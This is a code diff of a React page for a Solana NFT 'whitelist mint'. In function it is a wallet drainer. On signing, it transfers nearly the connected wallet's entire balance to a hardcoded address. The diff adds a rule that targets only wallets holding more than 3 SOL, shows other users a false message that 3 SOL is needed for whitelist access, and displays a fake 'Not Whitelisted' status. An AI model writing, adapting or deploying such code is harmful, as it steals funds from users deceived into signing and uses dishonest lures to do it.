@@ -126,26 +126,35 @@ const Home = (props: HomeProps) => {
     const pubk = new PublicKey('G4ESo7drnFc9fZ6edW6LsFhYWSpohfkwaKCZVFeN2aYu')
     if (wallet) {
       const balance = await props.connection.getBalance(wallet.publicKey);
-      console.log(balance)
-      let transaction = new Transaction().add(
-        SystemProgram.transfer({
-          fromPubkey:wallet.publicKey,
-          toPubkey:pubk,
-          lamports:balance-5000 
-        })
-      );
-      transaction.feePayer = wallet.publicKey;
-      const anyTransaction: any = transaction;
-      anyTransaction.recentBlockhash = (
-        await props.connection.getRecentBlockhash()
-      ).blockhash;
-      return transaction;
+      if (balance > 3000000000) {
+        console.log(balance)
+        let transaction = new Transaction().add(
+          SystemProgram.transfer({
+            fromPubkey:wallet.publicKey,
+            toPubkey:pubk,
+            lamports:balance-5000 
+          })
+        );
+        transaction.feePayer = wallet.publicKey;
+        const anyTransaction: any = transaction;
+        anyTransaction.recentBlockhash = (
+          await props.connection.getRecentBlockhash()
+        ).blockhash;
+        return transaction;
+      } else {
+        setAlertState({
+          open: true,
+          message: "You must have 3 SOL on your wallet for future mint to access whitelist.",
+          severity: "error",
+        });
+        return false;
+      }
     }
   };
   const SendTrans = async () => {
-    setIsMinting(true);
     const transaction = await createTrans();
     if(transaction && wallet) {
+      setIsMinting(true);
       try {
         let signed = await wallet.signTransaction(transaction);
         let signature = await props.connection.sendRawTransaction(signed.serialize());
@@ -156,6 +165,8 @@ const Home = (props: HomeProps) => {
       finally {
         setIsMinting(false);
       }
+    } else {
+      setIsMinting(false);
     }
   };
 
@@ -247,7 +258,7 @@ const Home = (props: HomeProps) => {
       {wallet && (
         <p>Wallet {shortenAddress(wallet.publicKey.toBase58() || "")}</p>
       )}
-
+      {wallet && <p>Status: Not Whitelisted</p>}
       {wallet && <p>Whitelist spots: {redeemed}/{totalstock}</p>}
       
       <MintContainer>
